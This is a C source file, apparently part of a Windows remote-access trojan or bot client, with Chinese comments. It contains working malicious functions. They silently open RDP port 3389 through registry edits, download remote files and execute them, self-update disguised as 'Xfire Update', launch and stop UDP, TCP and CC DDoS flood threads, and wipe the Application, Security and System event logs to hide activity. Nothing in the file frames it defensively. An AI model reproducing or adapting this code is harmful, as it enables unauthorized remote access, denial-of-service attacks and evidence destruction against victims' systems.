#include <tchar.h>
#include <tlhelp32.h>
//#include "inject.h"

BOOL proc_tag = false;
TCHAR temp_proc[1024]={0};

int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,LPCTSTR szData,DWORD dwDatae,int mode)
{
	HKEY  hKey; 
	DWORD dwDisposition;    
	int   iResult =0;

	HINSTANCE advapi32 = GetModuleHandleW(L"ADVAPI32.dll");

	typedef BOOL (WINAPI *RSVE)(HKEY hKey,LPCTSTR lpValueName,DWORD Reserved,DWORD dwType,const BYTE *lpData,DWORD cbData); 
	RSVE myrsve; 
#ifdef UNICODE
	myrsve= (RSVE)GetProcAddress(advapi32, "RegSetValueExW");
#else
	myrsve= (RSVE)GetProcAddress(advapi32, "RegSetValueExA");
#endif
			
  	typedef int (WINAPI *ROKE)(HKEY hKey,LPCTSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult); 
	ROKE myroke; 
#ifdef UNICODE
	myroke= (ROKE)GetProcAddress(advapi32, "RegOpenKeyExW");
#else
	myroke= (ROKE)GetProcAddress(advapi32, "RegOpenKeyExA");
#endif
	
	__try
	{	
		if(myroke(MainKey,SubKey,0,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)					 
			return 0;
		 		 			 
		switch(Type)
		{		 
		case REG_SZ:		 
		case REG_EXPAND_SZ:	
#ifdef UNICODE
			if(myrsve(hKey,Vname,0,Type,(LPBYTE)szData,lstrlen(szData)*2+1) == ERROR_SUCCESS) 
#else
			if(myrsve(hKey,Vname,0,Type,(LPBYTE)szData,lstrlen(szData)+1) == ERROR_SUCCESS)
#endif
				iResult =1;				 			
			break;
	    case REG_DWORD:	
			if(myrsve(hKey,Vname,0,Type,(LPBYTE)szData,4) == ERROR_SUCCESS)
				iResult =1;				 					 			 
		    break;
	    case REG_BINARY:
		    break;
		}
	}
	__finally 
	{
	   RegCloseKey(MainKey);		
	   RegCloseKey(hKey);
	}
	
	return iResult;
}

BOOL EnumProcesin(LPTSTR lpProcess)
{
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	PROCESSENTRY32 info;
    info.dwSize=sizeof(PROCESSENTRY32);
	if(Process32First(handle,&info))
	{
		if(GetLastError()==ERROR_NO_MORE_FILES )
		{
			return false;
		}
		
		if (_tcsstr(_tcsupr(info.szExeFile),_tcsupr(lpProcess)) > 0)
		{
			return true;
		}
		while(Process32Next(handle,&info)!=FALSE)
		{
			if (_tcsstr(_tcsupr(info.szExeFile),_tcsupr(lpProcess)) > 0)
			{
				return true;
			}
		}
	}
	
	CloseHandle(handle);
	
	return false;
}

//枚举窗体是否存在
BOOL CALLBACK EnumWindowsList(HWND hwnd, LPARAM lParam)
{
	TCHAR szClassName[254]={0};
	GetWindowText(hwnd,szClassName,254);
	if (_tcsstr(szClassName,temp_proc) != NULL)
	{
		proc_tag = true;
	}

	return true;
}

//开启3389.2003,2000

DWORD WINAPI Open3389(LPVOID lparam)
{
	DWORD Port=atoi((char*)lparam);
	if (Port > 0 && Port < 65535)
	{
		OSVERSIONINFO osver={sizeof(OSVERSIONINFO)};
		GetVersionEx(&osver);
		//判断是不是windows 2000，是，这样开3389
		if(osver.dwMajorVersion==5&&osver.dwMinorVersion==0)
		{
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache"),_T("Enabled"), REG_EXPAND_SZ, _T("0"), 32, 0);
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("Microsoft\\Windows NT\\CurrentVersion\\Winlogon"),_T("ShutdownWithoutLogon"), REG_EXPAND_SZ, _T("0"), 32, 0);
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"),_T("EnableAdminTSRemote"), REG_DWORD, _T("0x00000001"), 32, 0);
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"),_T("TSEnabled"), REG_DWORD, _T("0x00000001"), 32, 0);
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Services\\TermDD"),_T("Start"), REG_DWORD, _T("0x00000002"), 32, 0);
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Services\\TermService"),_T("Start"), REG_DWORD, _T("0x00000002"), 32, 0);
			WriteRegEx(HKEY_USERS,_T(".DEFAULT\\Keyboard Layout\\Toggle"),_T("Hotkey"),REG_EXPAND_SZ,_T("2"),32, 0);
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp"),_T("PortNumber"), REG_DWORD, (TCHAR*)lparam, 32, 0);
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"),_T("PortNumber"), REG_DWORD, (TCHAR*)lparam, 32, 0);
		}
		//判断是不是windows 2003，是，这样开3389
		if(osver.dwMajorVersion==5&&osver.dwMinorVersion==2)
		{
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), _T("fDenyTSConnections"), REG_DWORD, _T("0x0"), 32, 0);
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp"), _T("PortNumber"), REG_DWORD, (TCHAR*)lparam, 32, 0);
			WriteRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"),_T("PortNumber"),REG_DWORD,(TCHAR*)lparam, 32, 0);
		}	
	}
	
	return true;
}

DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	TCHAR	*lpURL = NULL;
	TCHAR	*lpFileName = NULL;
	nUrlLength = lstrlen((TCHAR *)lparam)*sizeof(TCHAR);
	
	if (nUrlLength == 0)
		return false;
	
	lpURL = (TCHAR *)mymalloc(nUrlLength + 2);
	
	memcpy(lpURL, lparam, nUrlLength + 2);
	
	lpFileName = _tcsrchr(lpURL, _T('/')) + 1;
	if (lpFileName == NULL)
		return false;

	if (!http_get(lpURL, lpFileName))
	{
		return false;
	}

	ShellExecute(GetDesktopWindow(),_T("open"),lpFileName,NULL,NULL,SW_NORMAL);
	
	myfree(lpURL);
	return true;
}

enum
{
	id_udp_wz = 0,
	id_udp_fg,
	Id_cc_rd,
	id_tcp,
	id_udp,
	id_cc,
	id_cc_get	
};

HANDLE ddosthread[4];

DWORD WINAPI DDOSLOOP(LPVOID lp)
{
	LPDDOSST para = (LPDDOSST)lp;
	
	if(para->istart == 0)	//stop attack 
	{
		for(int i=0;i<4;i++)
		{
			TerminateThread(ddosthread[i]);
			CloseHandle(ddosthread[i]);
			ddosthread[i] = 0;
		}
			
		return 0;
	}
	
	if(ddosthread[para->type] != NULL)	//started
		return 0;
	
	DWORD id;
	
	switch(para->type)
	{
		case id_udp_wz:
			ddosthread[para->type] = CreateThread(0,0,StartWZUDP,lp,0,&id);
			break;
			
		case id_udp_fg:
			ddosthread[para->type] = CreateThread(0,0,StartUDPS,lp,0,&id);
			break;
			
		case id_tcp:
			ddosthread[para->type] = CreateThread(0,0,StartXP,lp,0,&id);
			break;
			
		case Id_cc_rd:
			ddosthread[para->type] = CreateThread(0,0,StartSJLW,lp,0,&id);
			break;
	}
	
	return 0;
}

BOOL UpdateServer(LPCTSTR lpURL)
{
	TCHAR	*lpFileName = NULL;
#ifdef UNICODE	
	lpFileName = _tcsrchr((unsigned short *)lpURL, _T('/')) + 1;
#else
	lpFileName = strrchr(lpURL, _T('/')) + 1;
#endif
	if (lpFileName == NULL)
		return false;
	if (!http_get(lpURL, lpFileName))
		return false;
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = _T("WinSta0\\Default"); 
	return CreateProcess(lpFileName, _T("Xfire Update"), NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (lstrlen(lpszURL) == 0)
		return false;

	ShellExecute(GetDesktopWindow(),_T("open"),_T("c:\\Program Files\\Internet Explorer\\iexplorer.exe"),lpszURL,NULL,nShowCmd);

	return 0;
}

void CleanEvent()
{
	WCHAR *strEventName[] = {L"Application", L"Security", L"System"};

	HINSTANCE advapi32 = GetModuleHandleW(L"ADVAPI32.dll"); 
	
	typedef HANDLE (WINAPI *OEL)(LPCTSTR lpUNCServerName,LPCTSTR lpSourceName); 

	OEL myOpenEventLog = (OEL)GetProcAddress(advapi32, "OpenEventLogW");
	
	typedef BOOL (WINAPI *CEL)(HANDLE hEventLog,LPCTSTR lpBackupFileName); 
	CEL myClearEventLog= (CEL)GetProcAddress(advapi32, "ClearEventLogW");

	typedef BOOL (WINAPI *CELOG)(HANDLE hEventLog); 
	CELOG myCloseEventLog= (CELOG)GetProcAddress(advapi32, "CloseEventLog"); 

	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = myOpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		myClearEventLog(hHandle, NULL);
		myCloseEventLog(hHandle);
	}
}

void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
	TCHAR	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, _T("SYSTEM\\CurrentControlSet\\Services\\%s"), lpServiceName);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("Name"), REG_SZ, (TCHAR *)lpHostID, lstrlen(lpHostID), 0);
}

